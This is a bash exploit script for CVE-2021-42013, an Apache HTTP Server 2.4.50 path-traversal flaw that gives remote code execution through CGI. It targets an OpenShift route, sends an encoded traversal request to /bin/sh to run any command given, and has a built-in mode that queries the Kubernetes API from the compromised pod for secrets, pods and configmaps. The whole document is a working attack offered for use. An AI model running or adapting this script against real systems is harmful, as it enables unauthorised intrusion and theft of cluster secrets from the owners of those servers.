# Exploit: Apache HTTP Server 2.4.50 - Remote Code Execution (RCE) (2)
# Credits: Ash Daulton & cPanel Security Team
# Date: 24/07/2021
# Exploit Author: TheLastVvV.com
# Vendor Homepage:  https://apache.org/
# Version: Apache 2.4.50 with CGI enable
# Tested on : Debian 5.10.28
# CVE : CVE-2021-42013

#!/bin/bash

echo 'PoC CVE-2021-42013 reverse shell Apache 2.4.50 with CGI'

# Resolve asset-cache route host (HTTP)
route_host=$(oc -n frontend get route/asset-cache --output jsonpath={.spec.host} 2>/dev/null)
TARGET=""
if [ -n "$route_host" ]; then
  TARGET="http://$route_host"
fi

# Default User-Agent (can be overridden via --ua)
UA="asset-cache-anon-check"

usage(){
  echo "Usage: $0 [--ua <string>] [--check] <command|url>"
  echo "Examples:"
  echo "  $0 --ua 'asset-cache-test' https://kubernetes.default.svc/api/v1/secrets"
  echo "  $0 'curl -sS -k -H \"User-Agent: asset-cache-test\" https://kubernetes.default.svc/version'"
  echo "  # Built-in check: run bash -c curls inside pod via RCE"
  echo "  $0 --check"
}

exploit(){
  local host="$1"
  local cmd="$2"
  curl -sS "$host/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" \
    -d "echo Content-Type: text/plain; echo; $cmd"
}

rce_check(){
  local host="$1"
  # Use ClusterIP service names to avoid external routing/SNAT; set UA for audit correlation.
  # Run through /bin/bash -lc so we can use a loop inline.
  local script="bash -lc 'UA=\"$UA\"; for u in \
    https://kubernetes.default.svc/version \
    https://kubernetes.default.svc/api/v1/secrets \
    https://kubernetes.default.svc/api/v1/pods \
    https://kubernetes.default.svc/api/v1/configmaps; do \
      echo ===\> GET $u; \
        if command -v curl >/dev/null 2>&1; then \
          curl -sSk -H \"User-Agent: \$UA\" \"\$u\" | head -c 200 || true; \
        elif command -v wget >/dev/null 2>&1; then \
          wget -qO- --header=\"User-Agent: \$UA\" \"\$u\" | head -c 200 || true; \
        else \
          echo \"[no curl/wget in pod]\"; \
        fi; \
        echo; sleep 0.2; \
    done'"
  exploit "$host" "$script"
}

if [ -z "$TARGET" ] && [ -z "$1" ]; then
  usage
  exit 1
fi

# Parse optional --ua flag
ARGS=()
DO_CHECK=0
while [[ $# -gt 0 ]]; do
  case "$1" in
    --ua)
      UA="$2"; shift 2 ;;
    --check)
      DO_CHECK=1; shift ;;
    *)
      ARGS+=("$1"); shift ;;
  esac
done

# Determine host to target (allow full host URL as first arg in URL mode)
HOST="$TARGET"

# Build command to run via RCE
CMD=""
if [[ ${#ARGS[@]} -eq 0 && $DO_CHECK -eq 0 ]]; then
  usage; exit 1
fi

if [[ ${#ARGS[@]} -eq 1 && ${ARGS[0]} == http* ]]; then
  # Convenience URL mode: first arg is a URL to GET via curl
  CMD="curl -sS -k -H 'User-Agent: $UA' '${ARGS[0]}'"
else
  # Arbitrary command mode: pass entire argument list as one command string
  CMD="${ARGS[*]}"
fi

if [ -z "$HOST" ]; then
  echo "ERROR: No route found. Provide full target host as first argument (e.g., http://asset-cache.apps/... ) or login with oc."
  usage
  exit 1
fi

if [[ $DO_CHECK -eq 1 ]]; then
  echo "--- RCE bash -c anonymous checks (inside compromised pod) ---"
  rce_check "$HOST"
else
  exploit "$HOST" "$CMD"
fi
